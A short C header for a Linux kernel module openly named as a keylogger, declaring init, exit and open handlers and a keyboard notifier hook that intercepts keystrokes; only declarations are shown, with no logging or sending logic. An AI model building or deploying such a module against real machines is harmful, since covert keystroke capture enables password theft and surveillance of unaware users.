#ifndef KEY_LOGGER_H
#define KEY_LOGGER_H

#include <linux/fs.h>
#include <linux/types.h>
#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/input.h>

struct input_dev *idev;

void kbd_exit(void);
int kbd_init(void);
int kbd_open(struct inode *inode, struct file *filp);
int kbd_notifier(struct notifier_block* nblock, unsigned long code, void* param);

struct notifier_block nb = {
  .notifier_call = kbd_notifier
};

#endif
